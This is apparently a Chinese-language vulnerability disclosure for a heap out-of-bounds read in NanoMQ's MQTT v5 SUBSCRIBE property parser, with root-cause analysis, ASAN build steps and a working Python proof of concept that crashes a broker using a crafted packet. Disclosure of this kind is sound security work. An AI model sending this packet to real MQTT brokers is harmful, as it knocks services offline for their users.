# `nmq_subinfo_decode()`中的 MQTT v5SUBSCRIBE 解析堆越界读

### Summary

NanoMQ 的 broker 侧 MQTT v5 `SUBSCRIBE` 处理存在一个可远程触发的 `heap-buffer-overflow`。攻击者可以作为普通 MQTT client 连接 broker，发送特制的 v5 `SUBSCRIBE` 报文，使 `nmq_subinfo_decode()` 在解析重复的 `SUBSCRIPTION_IDENTIFIER` 属性时错误推进游标，最终驱动 `get_var_integer()` 读到真实堆分配边界之外。

这个问题影响的是 **broker 本身的收包路径**，不是 client/bridge 功能。在 ASAN 构建下可以稳定复现为进程崩溃；在普通构建下它仍然是 broker parser 中真实存在的越界读，应视为远程拒绝服务漏洞。

该问题已经在 NanoMQ `0.24.12` 上重新验证，因此受影响版本应直接视为 `<= 0.24.12`。

### Details
根因位于 [`nng/src/sp/protocol/mqtt/mqtt_parser.c`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c)。

易受攻击的函数是 [`nmq_subinfo_decode()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L1675)，它由 broker TCP 收包路径在 [`nng/src/sp/transport/mqtt/broker_tcp.c:938`](/home/ruoyu/nanomq/nng/src/sp/transport/mqtt/broker_tcp.c#L938) 调用。

关键代码如下：

```c
if (ver == MQTT_PROTOCOL_VERSION_v5) {
    len = get_var_integer((uint8_t *) nni_msg_body(msg) + 2, &len_of_varint);
}
...
case SUBSCRIPTION_IDENTIFIER:
    subid = get_var_integer(var_ptr + pos, &len_of_varint);
    if (subid == 0)
        return (-1);
    pos += len_of_varint;
    break;
```

相关位置：

- [`nng/src/sp/protocol/mqtt/mqtt_parser.c:1692`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L1692)
- [`nng/src/sp/protocol/mqtt/mqtt_parser.c:1724`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L1724)
- [`nng/src/sp/protocol/mqtt/mqtt_parser.c:1726`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L1726)
- [`nng/src/sp/protocol/mqtt/mqtt_parser.c:179`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L179)

[`get_var_integer()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L170) 的第二个参数同时承担了“输入游标”和“输出游标”的作用：

```c
uint32_t p = *pos;
...
temp = *(buf + p);
...
*pos = p;
```

但 `nmq_subinfo_decode()` 把同一个 `len_of_varint` 变量复用在两个不同的解析上下文中：

1. 先用于外层 `Properties Length` 字段，保存其 varint 占用字节数；
2. 后又直接作为 `SUBSCRIPTION_IDENTIFIER` 内层 varint 的起始游标传给 `get_var_integer()`。

问题在于：进入 `SUBSCRIPTION_IDENTIFIER` 分支前，这个变量**没有被清零**。因此，一旦外层 `Properties Length` 使用了多字节 varint，后续 `get_var_integer(var_ptr + pos, &len_of_varint)` 就不会从当前属性值的第一个字节开始读，而是会从一个非零偏移位置开始读。

再结合 [`get_var_integer()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L170) 本身缺少边界检查，攻击者就可以把 Properties 区填充为大量重复的 `0x0B`（`SUBSCRIPTION_IDENTIFIER` 属性 ID），让 parser 反复进入这个分支、错误推进 `pos`，最终从消息缓冲区末尾之外继续读取。

这和之前已经公开过的 `SUBSCRIBE` option-byte off-by-one（大约在 1776 行附近）不是同一个漏洞。之前那个漏洞发生在 topic option 解码阶段；这次崩溃发生得更早，是 **MQTT v5 properties 解析阶段** 的独立漏洞链。

该问题后来又在最新验证版本 NanoMQ `0.24.12` 上复测了一次，并且使用的是实际启用了 `DEBUG=1` 与 `ASAN=1` 的构建；同一条畸形 `SUBSCRIBE` 仍然可以稳定触发 ASAN `heap-buffer-overflow`，说明这不是只存在于旧分支中的问题。

在实际复现中，ASAN 报告显示：

- 崩溃位置：[`get_var_integer()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L179)
- 调用者：[`nmq_subinfo_decode()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L1726)
- 入口：[`broker_tcp.c:938`](/home/ruoyu/nanomq/nng/src/sp/transport/mqtt/broker_tcp.c#L938)

PoC 之所以稳定，是因为消息体长度被刻意构造成 **正好 1024 字节**。这是关键点，因为 [`nni_msg_alloc()`](/home/ruoyu/nanomq/nng/src/core/message.c#L416) 对 `>= 1024` 且为 2 的幂的消息体使用精确分配，不会额外留尾部冗余空间：

```c
if ((sz < 1024) || ((sz & (sz - 1)) != 0)) {
    rv = nni_chunk_grow(&m->m_body, sz + 32, 32);
} else {
    rv = nni_chunk_grow(&m->m_body, sz, 0);
}
```

因此，这条越界读会直接落到真实 heap redzone，被 ASAN 清晰捕获。

### PoC
如果要**专门在 NanoMQ `0.24.12` 上**复现，首先需要从 `0.24.12` 的源码目录构建一份真正启用了 ASAN 的二进制。

关键点：在 `0.24.12` 中，单独使用 `-DASAN=1` 还不够。顶层 CMake 只有在 `if (DEBUG)` 分支中才会追加 `-fsanitize=address`，因此必须同时指定 `-DASAN=1` 和 `-DDEBUG=1`。

```bash
cmake -S /home/ruoyu/new_version/nanomq \
  -B /home/ruoyu/new_version/nanomq/build-asan-debug \
  -DASAN=1 \
  -DDEBUG=1

cmake --build /home/ruoyu/new_version/nanomq/build-asan-debug -j4
```

然后启动 `0.24.12` 的 ASAN broker：

```bash
ASAN_OPTIONS=detect_leaks=0 \
/home/ruoyu/new_version/nanomq/build-asan-debug/nanomq/nanomq start \
  --conf /home/ruoyu/new_version/nanomq/etc/nanomq.conf \
  --log_level error \
  --log_stdout true
```

然后发送一条正常 MQTT v5 `CONNECT`，再发送一条特制的 MQTT v5 `SUBSCRIBE`：

```bash
python3 - <<'PY'
import socket
import time

host = "127.0.0.1"
port = 1883

connect = bytes([
    0x10, 0x10, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,
    0x05, 0x02, 0x00, 0x3C, 0x00, 0x00, 0x03, 0x70,
    0x6F, 0x63,
])

body = bytes([0x00, 0x01, 0xFC, 0x07]) + (b"\x0B" * 1019) + b"\x26"
sub = bytes([0x82, 0x80, 0x08]) + body

with socket.create_connection((host, port)) as s:
    s.sendall(connect)
    time.sleep(0.2)
    s.sendall(sub)
    time.sleep(0.5)
PY
```

恶意 `SUBSCRIBE` 的结构如下：

- fixed header：`82 80 08`
- packet id：`00 01`
- Properties Length：`FC 07`（即 `1020`）
- property bytes：`0x0B` 重复 1019 次，最后再加一个 `0x26`

在 NanoMQ `0.24.12` 的真实 ASAN 构建上，观察结果如下：

- `AddressSanitizer: heap-buffer-overflow`
- `READ of size 1`
- 崩在 [`get_var_integer()`](/home/ruoyu/nanomq/nng/src/sp/protocol/mqtt/mqtt_parser.c#L179)
- 在 `0.24.12` 上，调用点位于 `nmq_subinfo_decode()` 的 `mqtt_parser.c:1755`
- transport 入口为 [`broker_tcp.c:938`](/home/ruoyu/nanomq/nng/src/sp/transport/mqtt/broker_tcp.c#L938)

在 `0.24.12` 的 ASAN 报告中，消息缓冲区仍由 `broker_tcp.c:791` 分配，并且越界位置已经跨过真实的 1024 字节堆区边界。

![image-20260409195235857](C:\Users\Administrator\Desktop\RuoyuZhou\bug_reports\assets\image-20260409195235857.png)

### Impact
这是一个 **broker 侧、远程可达** 的 MQTT v5 `SUBSCRIBE` 内存安全漏洞。

受影响对象：

- NanoMQ `<= 0.24.12`。
- 接受 MQTT v5 client 连接的 NanoMQ broker TCP 部署。
- TLS 和 WebSocket broker transport 也会调用同一个 parser 函数，因此只要这些监听开启，理论上共享同一根因；不过本次 PoC 是在 TCP 上完成的直接复现。

安全影响：

- 攻击者只要能够建立 MQTT 会话，就可以通过一条特制的 MQTT v5 `SUBSCRIBE` 使 broker 崩溃。
- 在 ASAN 构建下，该问题可稳定表现为 `heap-buffer-overflow`。
- 在非 ASAN 构建下，它依然是 broker parser 中真实存在的越界读，应视为远程拒绝服务问题。
